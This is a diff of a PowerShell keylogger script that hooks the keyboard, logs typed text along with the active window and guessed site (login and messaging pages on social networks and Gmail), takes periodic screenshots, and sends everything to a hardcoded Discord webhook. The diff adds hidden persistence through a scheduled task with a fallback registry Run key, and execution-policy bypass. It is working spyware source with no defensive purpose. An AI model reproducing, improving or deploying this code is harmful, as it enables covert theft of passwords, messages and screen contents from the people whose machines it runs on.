@@ -1,6 +1,16 @@
 $webhookUrl = "https://discord.com/api/webhooks/1370769053525868636/K7tsBhS0bi0S9Y-TusKDpF1dbmE0PUPbYgn0FG0Yu1qAzOxTmx6yuIiyUsCMGroal1ib"
+$dataPath = "$env:TEMP\sysdata.json"
 $deviceId = "DIGISK01"
 $logPath = "$env:TEMP\keylogger.log"
+$screenshotFolder = "$env:TEMP\screenshots"
+$currentBuffer = ""
+$lastUrl = ""
+$lastTitle = ""
+
+# Ensure screenshot folder exists
+if (!(Test-Path $screenshotFolder)) {
+    New-Item -ItemType Directory -Path $screenshotFolder | Out-Null
+}
 
 # Start logging to file
 try {
@@ -10,22 +20,31 @@ try {
     Write-Warning "Failed to start transcript"
 }
 
-# Initialize variables for text capture
-$currentText = ""
-$lastSendTime = Get-Date
-$windowTitle = "Unknown"
-$lastWindowTitle = "Unknown"
+# Create data file if it doesn't exist
+if (!(Test-Path $dataPath)) {
+    try {
+        @{
+            device = $deviceId
+            logs = @()
+            buffers = @()
+        } | ConvertTo-Json | Set-Content -Path $dataPath
+        Write-Host "Created new data file at $dataPath"
+    } catch {
+        Write-Host "Failed to create data file: $_" -ForegroundColor Red
+    }
+}
 
 # Load required assemblies
 try {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
+    Add-Type -AssemblyName Microsoft.VisualBasic
 } catch {
     Write-Host "Failed to load assemblies: $_" -ForegroundColor Red
     exit
 }
 
-# API signatures for keylogger
+# API signatures for keylogger and additional functions
 $APIsignatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
 public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -39,6 +58,15 @@ public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam,
 [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
 public static extern IntPtr GetModuleHandle(string lpModuleName);
 
+[DllImport("user32.dll")]
+public static extern IntPtr GetForegroundWindow();
+
+[DllImport("user32.dll", SetLastError=true)]
+public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
+public static extern IntPtr GetActiveWindow();
+
 public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
 '@
 
@@ -51,6 +79,263 @@ try {
 
 $WH_KEYBOARD_LL = 13
 $hookId = [IntPtr]::Zero
+$VK_RETURN = 0x0D
+
+# Function to get active browser info
+function Get-ActiveBrowserInfo {
+    try {
+        $hwnd = [KeyLogger.WinAPI]::GetForegroundWindow()
+        $pid = 0
+        [void][KeyLogger.WinAPI]::GetWindowThreadProcessId($hwnd, [ref]$pid)
+        
+        $process = Get-Process -Id $pid -ErrorAction SilentlyContinue
+        if (!$process) { return @{title = "Unknown"; url = "Unknown"; browser = "Unknown"} }
+        
+        $windowTitle = $process.MainWindowTitle
+        
+        # Extract browser name
+        $browserName = "Unknown"
+        switch -Wildcard ($process.ProcessName.ToLower()) {
+            "chrome*" { $browserName = "Chrome" }
+            "firefox*" { $browserName = "Firefox" }
+            "msedge*" { $browserName = "Edge" }
+            "iexplore*" { $browserName = "Internet Explorer" }
+            "opera*" { $browserName = "Opera" }
+            "safari*" { $browserName = "Safari" }
+            "brave*" { $browserName = "Brave" }
+            default { $browserName = $process.ProcessName }
+        }
+        
+        # Try to extract URL from title (this is a basic approach)
+        $url = "Unknown"
+        if ($browserName -ne "Unknown") {
+            # Try to extract domain from title
+            $urlPattern = "(?:https?:\/\/)?(?:www\.)?([a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)+)(?:\/[^\s]*)?"
+            $urlMatch = [regex]::Match($windowTitle, $urlPattern)
+            
+            if ($urlMatch.Success) {
+                $url = $urlMatch.Groups[0].Value
+            } else {
+                # Extract potential page path info from title
+                $pathInfo = ""
+                
+                # Common social media title patterns
+                if ($windowTitle -match "Instagram") {
+                    if ($windowTitle -match "Login") { $pathInfo = "/login" }
+                    elseif ($windowTitle -match "Direct") { $pathInfo = "/direct/inbox" }
+                    elseif ($windowTitle -match "Profile") { $pathInfo = "/profile" }
+                    $url = "instagram.com$pathInfo"
+                }
+                elseif ($windowTitle -match "Facebook") {
+                    if ($windowTitle -match "Messenger") { $pathInfo = "/messages" }
+                    elseif ($windowTitle -match "Profile") { $pathInfo = "/profile" }
+                    $url = "facebook.com$pathInfo"
+                }
+                elseif ($windowTitle -match "Twitter|X") {
+                    if ($windowTitle -match "Messages") { $pathInfo = "/messages" }
+                    elseif ($windowTitle -match "Profile") { $pathInfo = "/profile" }
+                    $url = "twitter.com$pathInfo"
+                }
+                elseif ($windowTitle -match "Gmail") {
+                    $url = "mail.google.com"
+                }
+                elseif ($windowTitle -match "YouTube") {
+                    $url = "youtube.com"
+                }
+                elseif ($windowTitle -match "Discord") {
+                    $url = "discord.com"
+                }
+                else {
+                    # Generic domain extraction from window title
+                    $words = $windowTitle -split ' ' | Where-Object { $_ -match '\.' }
+                    if ($words) {
+                        $potentialDomain = $words | Where-Object { $_ -match '^\w+\.\w+$' } | Select-Object -First 1
+                        if ($potentialDomain) {
+                            $url = $potentialDomain
+                        }
+                    }
+                }
+            }
+        }
+        
+        return @{
+            title = $windowTitle
+            url = $url
+            browser = $browserName
+        }
+    } catch {
+        Write-Host "Error getting browser info: $_" -ForegroundColor Red
+        return @{title = "Error"; url = "Error"; browser = "Error"}
+    }
+}
+
+# Function to take screenshots
+function Take-Screenshot {
+    try {
+        $timestamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+        $screenshotPath = Join-Path $screenshotFolder "screenshot-$timestamp.png"
+        
+        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
+        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        
+        return $screenshotPath
+    } catch {
+        Write-Host "Error taking screenshot: $_" -ForegroundColor Red
+        return $null
+    }
+}
+
+# Function to send buffer data
+function Send-BufferData {
+    param (
+        [string]$buffer,
+        [string]$title,
+        [string]$url,
+        [string]$browserName
+    )
+    
+    if ([string]::IsNullOrWhiteSpace($buffer)) { return }
+    
+    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+    $computerName = $env:COMPUTERNAME
+    $userName = $env:USERNAME
+    
+    # Create a better looking embed
+    $embed = @{
+        title = "Words without pressing enter"
+        description = "```$buffer```"
+        color = 15158332 # Red color
+        footer = @{
+            text = "Captured at $timestamp"
+        }
+        fields = @(
+            @{name = 'Computer'; value = $computerName; inline = $true},
+            @{name = 'User'; value = $userName; inline = $true},
+            @{name = 'Browser'; value = $browserName; inline = $true},
+            @{name = 'URL'; value = $url; inline = $false},
+            @{name = 'Window Title'; value = $title; inline = $false}
+        )
+    }
+    
+    $payload = @{
+        username = 'KeyLogger'
+        embeds = @($embed)
+    }
+    
+    try {
+        $payloadJson = $payload | ConvertTo-Json -Depth 4
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
+        Write-Host "Buffer data sent successfully" -ForegroundColor Green
+    } catch {
+        Write-Host "Error sending buffer data: $_" -ForegroundColor Red
+    }
+}
+
+# Function to send enter press data
+function Send-EnterData {
+    param (
+        [string]$text,
+        [string]$title,
+        [string]$url,
+        [string]$browserName
+    )
+    
+    if ([string]::IsNullOrWhiteSpace($text)) { return }
+    
+    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+    $computerName = $env:COMPUTERNAME
+    $userName = $env:USERNAME
+    
+    # Take screenshot for each Enter press
+    $screenshotPath = Take-Screenshot
+    $hasScreenshot = $screenshotPath -ne $null
+    
+    # Create a cleaner looking embed
+    $embed = @{
+        title = "$browserName Keylog Data"
+        description = "```$text```"
+        color = 3447003 # Blue color
+        footer = @{
+            text = "ENTER pressed at $timestamp"
+        }
+        fields = @(
+            @{name = 'Computer'; value = $computerName; inline = $true},
+            @{name = 'User'; value = $userName; inline = $true},
+            @{name = 'Browser'; value = $browserName; inline = $true},
+            @{name = 'URL'; value = $url; inline = $false},
+            @{name = 'Window Title'; value = $title; inline = $false}
+        )
+    }
+    
+    $payload = @{
+        username = 'KeyLogger'
+        embeds = @($embed)
+    }
+    
+    # If we have a screenshot, prepare to send it separately
+    if ($hasScreenshot) {
+        try {
+            # First send the text data
+            $payloadJson = $payload | ConvertTo-Json -Depth 4
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
+            
+            # Then send the screenshot
+            $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
+            $boundary = [System.Guid]::NewGuid().ToString()
+            $LF = "`r`n"
+            
+            $bodyLines = @(
+                "--$boundary",
+                "Content-Disposition: form-data; name=`"payload_json`"",
+                "Content-Type: application/json$LF",
+                "{`"username`":`"KeyLogger`",$LF`"content`":`"Screenshot at $timestamp`"}",
+                "--$boundary",
+                "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $screenshotPath -Leaf)`"",
+                "Content-Type: image/png$LF"
+            ) -join $LF
+            
+            $bodyEnd = "$LF--$boundary--$LF"
+            
+            $bodyStart = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)
+            $bodyEndBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyEnd)
+            
+            $requestBytes = New-Object byte[] ($bodyStart.Length + $fileBytes.Length + $bodyEndBytes.Length)
+            [System.Buffer]::BlockCopy($bodyStart, 0, $requestBytes, 0, $bodyStart.Length)
+            [System.Buffer]::BlockCopy($fileBytes, 0, $requestBytes, $bodyStart.Length, $fileBytes.Length)
+            [System.Buffer]::BlockCopy($bodyEndBytes, 0, $requestBytes, $bodyStart.Length + $fileBytes.Length, $bodyEndBytes.Length)
+            
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $requestBytes
+            
+            # Clean up screenshot file
+            Remove-Item $screenshotPath -Force
+        } catch {
+            Write-Host "Error sending data with screenshot: $_" -ForegroundColor Red
+            
+            # Fall back to just text if multipart fails
+            try {
+                $payloadJson = $payload | ConvertTo-Json -Depth 4
+                Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
+            } catch {
+                Write-Host "Error sending fallback data: $_" -ForegroundColor Red
+            }
+        }
+    } else {
+        # Just send text data if no screenshot
+        try {
+            $payloadJson = $payload | ConvertTo-Json -Depth 4
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
+        } catch {
+            Write-Host "Error sending enter data: $_" -ForegroundColor Red
+        }
+    }
+    
+    Write-Host "Enter data sent successfully" -ForegroundColor Green
+}
 
 # Keyboard hook procedure
 $keyboardHookDelegate = [KeyLogger.WinAPI+HookProc] {
@@ -59,138 +344,255 @@ $keyboardHookDelegate = [KeyLogger.WinAPI+HookProc] {
     if ($nCode -ge 0) {
         $vkCode = [System.Runtime.InteropServices.Marshal]::ReadInt32($lParam)
         $keyState = [System.Windows.Forms.Keys]$vkCode
+        $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
         
-        try {
-            $activeWindow = (Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Select-Object -First 1).MainWindowTitle
-            if (-not [string]::IsNullOrEmpty($activeWindow)) { 
-                $windowTitle = $activeWindow 
-            }
-        } catch {
-            $windowTitle = "Unknown"
-        }
+        # Get active window info
+        $browserInfo = Get-ActiveBrowserInfo
+        $activeWindow = $browserInfo.title
+        $currentUrl = $browserInfo.url
+        $browserName = $browserInfo.browser
         
-        # Check if window changed
-        if ($windowTitle -ne $lastWindowTitle) {
-            if (-not [string]::IsNullOrEmpty($currentText)) {
-                Send-Chunk -text $currentText -title $lastWindowTitle -completed $false
-                $currentText = ""
-            }
-            $lastWindowTitle = $windowTitle
-        }
-        
-        # Handle key presses
-        switch ($keyState) {
-            "Return" {
-                if (-not [string]::IsNullOrEmpty($currentText)) {
-                    Send-Chunk -text $currentText -title $windowTitle -completed $true
-                    $currentText = ""
+        # Handle different key presses
+        if ($wParam -eq 0x0100 -or $wParam -eq 0x0104) { # WM_KEYDOWN or WM_SYSKEYDOWN
+            $keyChar = $null
+            
+            # Convert key code to character
+            switch ($keyState) {
+                # Handle special keys
+                ([System.Windows.Forms.Keys]::Return) { 
+                    # When Enter is pressed, send current buffer
+                    if ($currentBuffer -ne "") {
+                        Send-EnterData -text $currentBuffer -title $activeWindow -url $currentUrl -browserName $browserName
+                        $currentBuffer = ""
+                    }
+                    return [KeyLogger.WinAPI]::CallNextHookEx([IntPtr]::Zero, $nCode, $wParam, $lParam) 
+                }
+                ([System.Windows.Forms.Keys]::Back) { 
+                    if ($currentBuffer.Length -gt 0) {
+                        $currentBuffer = $currentBuffer.Substring(0, $currentBuffer.Length - 1)
+                    }
+                }
+                ([System.Windows.Forms.Keys]::Tab) { $keyChar = "[TAB]" }
+                ([System.Windows.Forms.Keys]::Space) { $keyChar = " " }
+                ([System.Windows.Forms.Keys]::Delete) { $keyChar = "[DEL]" }
+                ([System.Windows.Forms.Keys]::Escape) { $keyChar = "[ESC]" }
+                Default {
+                    # Convert regular keys to characters
+                    # Check for shift and caps lock
+                    $capsLock = [System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]::CapsLock)
+                    $shiftKey = [System.Windows.Forms.Control]::ModifierKeys -band [System.Windows.Forms.Keys]::Shift
+                    
+                    # Handle letters
+                    if ($keyState -ge ([System.Windows.Forms.Keys]::A) -and $keyState -le ([System.Windows.Forms.Keys]::Z)) {
+                        if ($capsLock -xor $shiftKey) {
+                            $keyChar = $keyState.ToString()
+                        } else {
+                            $keyChar = $keyState.ToString().ToLower()
+                        }
+                    }
+                    # Handle numbers and symbols (simplistic approach)
+                    elseif ($keyState -ge ([System.Windows.Forms.Keys]::D0) -and $keyState -le ([System.Windows.Forms.Keys]::D9)) {
+                        $digit = $keyState.ToString().Substring(1)
+                        $keyChar = if ($shiftKey) {
+                            switch ($digit) {
+                                "0" { ")" }
+                                "1" { "!" }
+                                "2" { "@" }
+                                "3" { "#" }
+                                "4" { "$" }
+                                "5" { "%" }
+                                "6" { "^" }
+                                "7" { "&" }
+                                "8" { "*" }
+                                "9" { "(" }
+                                Default { $digit }
+                            }
+                        } else { $digit }
+                    }
+                    # Handle numpad
+                    elseif ($keyState -ge ([System.Windows.Forms.Keys]::NumPad0) -and $keyState -le ([System.Windows.Forms.Keys]::NumPad9)) {
+                        $keyChar = $keyState.ToString().Substring(6)
+                    }
+                    # Handle other keys
+                    else {
+                        # Common special characters
+                        switch ($keyState) {
+                            ([System.Windows.Forms.Keys]::OemPeriod) { $keyChar = if ($shiftKey) { ">" } else { "." } }
+                            ([System.Windows.Forms.Keys]::Oemcomma) { $keyChar = if ($shiftKey) { "<" } else { "," } }
+                            ([System.Windows.Forms.Keys]::OemSemicolon) { $keyChar = if ($shiftKey) { ":" } else { ";" } }
+                            ([System.Windows.Forms.Keys]::OemQuestion) { $keyChar = if ($shiftKey) { "?" } else { "/" } }
+                            ([System.Windows.Forms.Keys]::OemQuotes) { $keyChar = if ($shiftKey) { '"' } else { "'" } }
+                            ([System.Windows.Forms.Keys]::OemOpenBrackets) { $keyChar = if ($shiftKey) { "{" } else { "[" } }
+                            ([System.Windows.Forms.Keys]::OemCloseBrackets) { $keyChar = if ($shiftKey) { "}" } else { "]" } }
+                            ([System.Windows.Forms.Keys]::OemMinus) { $keyChar = if ($shiftKey) { "_" } else { "-" } }
+                            ([System.Windows.Forms.Keys]::Oemplus) { $keyChar = if ($shiftKey) { "+" } else { "=" } }
+                            ([System.Windows.Forms.Keys]::Oemtilde) { $keyChar = if ($shiftKey) { "~" } else { "`" } }
+                            ([System.Windows.Forms.Keys]::OemBackslash) { $keyChar = if ($shiftKey) { "|" } else { "\" } }
+                            Default { $keyChar = $null }
+                        }
+                    }
                 }
             }
-            "Back" {
-                if ($currentText.Length -gt 0) {
-                    $currentText = $currentText.Substring(0, $currentText.Length - 1)
+            
+            # Append key to buffer if it's a valid character
+            if ($keyChar -ne $null) {
+                $currentBuffer += $keyChar
+                
+                # Check if window changed - if so, should send buffer as "Words without pressing enter"
+                if (($lastTitle -ne $activeWindow -or $lastUrl -ne $currentUrl) -and $currentBuffer.Length -gt 0) {
+                    if ($lastTitle -ne "") {  # Don't send on first keypress
+                        Send-BufferData -buffer $currentBuffer -title $lastTitle -url $lastUrl -browserName $browserName
+                    }
+                    $currentBuffer = $keyChar  # Reset with current key
                 }
+                
+                # Update last window info
+                $lastTitle = $activeWindow
+                $lastUrl = $currentUrl
             }
-            "Space" {
-                $currentText += " "
-            }
-            { $_ -match "^[A-Z]$" } {
-                $currentText += $keyState.ToString().ToLower()
-            }
-            { $_ -match "^[A-Z0-9Oem.+/\-=\[\];',\`"]$" } {
-                $currentText += $keyState.ToString()
-            }
-        }
-        
-        # Periodically send incomplete chunks
-        if ((Get-Date) - $lastSendTime -gt [TimeSpan]::FromMinutes(1) -and -not [string]::IsNullOrEmpty($currentText)) {
-            Send-Chunk -text $currentText -title $windowTitle -completed $false
-            $currentText = ""
         }
     }
     
     return [KeyLogger.WinAPI]::CallNextHookEx([IntPtr]::Zero, $nCode, $wParam, $lParam)
 }
 
-function Send-Chunk {
-    param(
-        [string]$text,
-        [string]$title,
-        [bool]$completed
-    )
-    
-    $lastSendTime = Get-Date
-    $computerName = $env:COMPUTERNAME
-    $userName = $env:USERNAME
-    
-    $status = if ($completed) { "Completed Input" } else { "Partial Input" }
-    
-    $payload = @{
-        username = 'KeyLogger'
-        embeds = @(
-            @{
-                title = "Captured Text - $status"
-                description = "```$text```"
-                color = if ($completed) { 65280 } else { 16753920 }
-                fields = @(
-                    @{name = 'Window'; value = $title; inline = $true},
-                    @{name = 'Computer'; value = $computerName; inline = $true},
-                    @{name = 'User'; value = $userName; inline = $true}
-                )
-                timestamp = [DateTime]::UtcNow.ToString("o")
-            }
-        )
-    }
-    
-    try {
-        if (Test-Internet) {
-            $payloadJson = $payload | ConvertTo-Json -Depth 4
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
-            Write-Host "Sent text chunk ($status)" -ForegroundColor Green
-        }
-    } catch {
-        Write-Host "Failed to send chunk: $_" -ForegroundColor Red
-    }
-}
-
-function Test-Internet {
-    try {
-        $response = Invoke-WebRequest "http://www.google.com" -UseBasicParsing -TimeoutSec 3
-        return $true
-    } catch {
-        return $false
-    }
-}
-
-function Setup-Persistence {
-    $scriptPath = "$env:TEMP\sysmgr.ps1"
-    try {
-        $scriptContent = [System.IO.File]::ReadAllText($MyInvocation.MyCommand.Definition)
-        Set-Content -Path $scriptPath -Value $scriptContent
-        
-        # Registry persistence (works without admin)
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        if (-not (Test-Path $regPath)) {
-            New-Item -Path $regPath -Force | Out-Null
-        }
-        Set-ItemProperty -Path $regPath -Name "SystemManager" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-        Write-Host "Persistence set via registry" -ForegroundColor Green
-    } catch {
-        Write-Host "Failed to set up persistence: $_" -ForegroundColor Red
-    }
-}
-
 # Install keyboard hook
 try {
     $hookId = [KeyLogger.WinAPI]::SetWindowsHookEx($WH_KEYBOARD_LL, $keyboardHookDelegate, [KeyLogger.WinAPI]::GetModuleHandle($null), 0)
-    Write-Host "Keyboard hook installed successfully" -ForegroundColor Green
+    Write-Host "Keyboard hook installed successfully"
 } catch {
     Write-Host "Failed to install keyboard hook: $_" -ForegroundColor Red
     exit
 }
 
+function Test-Internet {
+    try {
+        $response = Invoke-WebRequest "http://www.google.com" -UseBasicParsing -TimeoutSec 2
+        return $true
+    } catch {
+        Write-Host "Internet test failed: $_" -ForegroundColor Yellow
+        return $false
+    }
+}
+
+function Setup-Persistence {
+    # Create script copy in TEMP
+    $scriptPath = "$env:TEMP\sysmgr.ps1"
+    try {
+        # Alternative to -Raw parameter for older PowerShell versions
+        $scriptContent = [System.IO.File]::ReadAllText($MyInvocation.MyCommand.Definition)
+        Set-Content -Path $scriptPath -Value $scriptContent
+        
+        # Create scheduled task (non-admin version)
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -RunOnlyIfNetworkAvailable
+        
+        try {
+            # Try to register task for current user only
+            Register-ScheduledTask -TaskName "SystemManager" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction Stop
+            Write-Host "Persistence task created successfully" -ForegroundColor Green
+        } catch {
+            # Fallback to registry run key if task creation fails
+            Write-Host "Failed to create scheduled task: $_" -ForegroundColor Yellow
+            Write-Host "Attempting registry persistence..."
+            try {
+                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+                Set-ItemProperty -Path $regPath -Name "SystemManager" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+                Write-Host "Registry persistence set successfully" -ForegroundColor Green
+            } catch {
+                Write-Host "Failed to set registry persistence: $_" -ForegroundColor Red
+            }
+        }
+    } catch {
+        Write-Host "Failed to set up persistence: $_" -ForegroundColor Red
+    }
+}
+
 # Main execution
 Setup-Persistence
 
-Write-Host "Keylogger running. Press Ctrl+C to stop." -ForegroundColor Green
-while ($true) { Start-Sleep -Seconds 60 }
+# Take initial screenshot
+Take-Screenshot
+
+# Set up timer for periodic screenshots
+try {
+    $screenshotTimer = New-Object System.Timers.Timer
+    $screenshotTimer.Interval = 10000 # 10 seconds
+    $screenshotTimer.AutoReset = $true
+    $screenshotTimer.Enabled = $true
+    
+    Register-ObjectEvent -InputObject $screenshotTimer -EventName Elapsed -Action {
+        # Send screenshot if we have internet
+        if (Test-Internet) {
+            $screenshotPath = Take-Screenshot
+            
+            if ($screenshotPath -ne $null) {
+                try {
+                    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+                    $computerName = $env:COMPUTERNAME
+                    $userName = $env:USERNAME
+                    $browserInfo = Get-ActiveBrowserInfo
+                    
+                    # Send screenshot via Discord webhook
+                    $boundary = [System.Guid]::NewGuid().ToString()
+                    $LF = "`r`n"
+                    
+                    $bodyLines = @(
+                        "--$boundary",
+                        "Content-Disposition: form-data; name=`"payload_json`"",
+                        "Content-Type: application/json$LF",
+                        "{`"username`":`"KeyLogger`",$LF`"content`":`"Periodic screenshot from $computerName / $userName`",$LF`"embeds`":[{`"title`":`"$($browserInfo.browser) - $($browserInfo.url)`",$LF`"color`":5793266,$LF`"footer`":{`"text`":`"Captured at $timestamp`"}}]}",
+                        "--$boundary",
+                        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $screenshotPath -Leaf)`"",
+                        "Content-Type: image/png$LF"
+                    ) -join $LF
+                    
+                    $bodyEnd = "$LF--$boundary--$LF"
+                    
+                    $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
+                    $bodyStart = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)
+                    $bodyEndBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyEnd)
+                    
+                    $requestBytes = New-Object byte[] ($bodyStart.Length + $fileBytes.Length + $bodyEndBytes.Length)
+                    [System.Buffer]::BlockCopy($bodyStart, 0, $requestBytes, 0, $bodyStart.Length)
+                    [System.Buffer]::BlockCopy($fileBytes, 0, $requestBytes, $bodyStart.Length, $fileBytes.Length)
+                    [System.Buffer]::BlockCopy($bodyEndBytes, 0, $requestBytes, $bodyStart.Length + $fileBytes.Length, $bodyEndBytes.Length)
+                    
+                    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $requestBytes
+                    
+                    # Clean up screenshot file
+                    Remove-Item $screenshotPath -Force
+                } catch {
+                    Write-Host "Error sending scheduled screenshot: $_" -ForegroundColor Red
+                }
+            }
+        }
+    } | Out-Null
+    
+    # Timer to check for unsent buffer (send every 30 seconds if not empty)
+    $bufferTimer = New-Object System.Timers.Timer
+    $bufferTimer.Interval = 30000 # 30 seconds
+    $bufferTimer.AutoReset = $true
+    $bufferTimer.Enabled = $true
+    
+    Register-ObjectEvent -InputObject $bufferTimer -EventName Elapsed -Action {
+        if ($currentBuffer -ne "") {
+            $browserInfo = Get-ActiveBrowserInfo
+            Send-BufferData -buffer $currentBuffer -title $browserInfo.title -url $browserInfo.url -browserName $browserInfo.browser
+            # Keep buffer for now (will be cleared on ENTER)
+        }
+    } | Out-Null
+    
+    Write-Host "Keylogger running. Press Ctrl+C to stop." -ForegroundColor Green
+    while ($true) { Start-Sleep -Seconds 60 }
+} finally {
+    try {
+        Stop-Transcript
+        if ($hookId -ne [IntPtr]::Zero) {
+            [KeyLogger.WinAPI]::UnhookWindowsHookEx($hookId)
+        }
+    } catch {
+        Write-Host "Cleanup error: $_" -ForegroundColor Yellow
+    }
+}
